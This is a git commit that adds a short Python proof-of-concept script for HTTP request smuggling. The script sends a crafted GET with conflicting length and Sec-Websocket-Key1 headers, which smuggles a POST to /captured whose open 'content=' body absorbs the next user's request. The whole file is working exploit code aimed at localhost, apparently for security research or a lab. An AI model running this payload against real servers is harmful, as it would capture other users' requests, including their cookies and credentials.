4d7df7b9892577c66698b5736a2d1967683089db
rizemon <tan.jia.le.98@gmail.com>
2023-03-26 05:43:36 -0400

    Add POC for capturing other user requests

---
+++ poc/poc1_capture.py
@@ -0,0 +1,34 @@
+import socket
+import sys
+
+SERVER = "127.0.0.1"
+PORT = 80
+
+PAYLOAD = (
+    b"GET / HTTP/1.1\r\n" +
+    b"Host: localhost\r\n" +
+    b"Content-Length: 130\r\n" +
+    b"Sec-Websocket-Key1: x\r\n" + 
+    b"\r\n" +
+    b"xxxxxxxxPOST /captured HTTP/1.1\r\n" +
+    b"Host: localhost\r\n" +  
+    b"Content-Type: application/x-www-form-urlencoded\r\n" +
+    b"Content-Length: 101\r\n" +
+    b"\r\n" +
+    b"content="
+)
+
+def visualise_payload():
+    print(PAYLOAD.decode().replace("\r\n", "\\r\\n\r\n"))
+
+def main():
+    visualise_payload()
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setblocking(True)
+    sock.connect((SERVER, PORT))
+    sock.send(PAYLOAD)
+    sock.close()
+
+if __name__  == "__main__":
+    main()
